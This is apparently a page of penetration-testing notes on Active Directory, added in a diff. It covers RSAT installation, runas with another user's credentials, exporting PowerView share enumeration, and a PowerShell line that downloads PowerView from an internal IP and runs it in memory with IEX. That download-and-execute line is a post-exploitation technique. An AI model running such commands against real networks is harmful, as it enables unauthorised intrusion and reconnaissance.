@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Helpful Commands and Scripts - Notes</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Installing Remote Server Administation Tools", url: "#_top", children: [
+          ]},
+          {title: "Runas / Testing a user account", url: "#runas-testing-a-user-account", children: [
+          ]},
+          {title: "Export to CSV", url: "#export-to-csv", children: [
+          ]},
+          {title: "Download module an inject into memory", url: "#download-module-an-inject-into-memory", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../transferring_files/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../transferring_files/" class="btn btn-xs btn-link">
+        Transferring Files
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../../attacking_internal_network/list_of_common_ports/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../../attacking_internal_network/list_of_common_ports/" class="btn btn-xs btn-link">
+        List of Common Ports
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="installing-remote-server-administation-tools">Installing Remote Server Administation Tools<a class="headerlink" href="#installing-remote-server-administation-tools" title="Permanent link">#</a></h2>
+<p>You can download it from powershell like this:</p>
+<pre><code>Enable-WindowsOptionalFeature -Online -FeatureName RSATClient-Roles-AD-Powershell
+
+import-module activedirectory
+</code></pre>
+
+<p>If that doesnt work, you need to download it, just google Rmote Server ADministation tool WIndows 10, 8 or whatever.
+Download it. Install it. Restart the the computer.</p>
+<p>Open up <code>Control Panel / Turn Windows Features on and Off / Rmote Server ADministation Tools / Role Administation TOols / AD DS and AD LDS tools / Active directory module for windows powershell</code></p>
+<h2 id="runas-testing-a-user-account">Runas / Testing a user account<a class="headerlink" href="#runas-testing-a-user-account" title="Permanent link">#</a></h2>
+<p>Say to get access to creds from a user. Or just want to run a program in the context of another user. Kind of like SUDO put over the network, you can do:</p>
+<pre><code>runas /user:USERNAME@domain.local cmd.exe
+or
+runsas /user:domain.local\USERNAME
+</code></pre>
+
+<h2 id="export-to-csv">Export to CSV<a class="headerlink" href="#export-to-csv" title="Permanent link">#</a></h2>
+<p>You can always pipe the return data to a CSV file, like this:</p>
+<pre><code class="powerview">find-domainshare -CheckShareAccess | Export-Csv qwe.csv
+</code></pre>
+
+<h2 id="download-module-an-inject-into-memory">Download module an inject into memory<a class="headerlink" href="#download-module-an-inject-into-memory" title="Permanent link">#</a></h2>
+<p>If you are using PowerView, remember to use the Dev-version, since it is correct with the documentation. </p>
+<pre><code class="powershell">IEX (New-Object Net.WebClient).DownloadString('http://192.168.66.123/PowerView.ps1');
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../transferring_files/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../transferring_files/" class="btn btn-xs btn-link">
+        Transferring Files
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../../attacking_internal_network/list_of_common_ports/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../../attacking_internal_network/list_of_common_ports/" class="btn btn-xs btn-link">
+        List of Common Ports
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_active_directory_domain/good_to_know/active_directory_help_commands.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
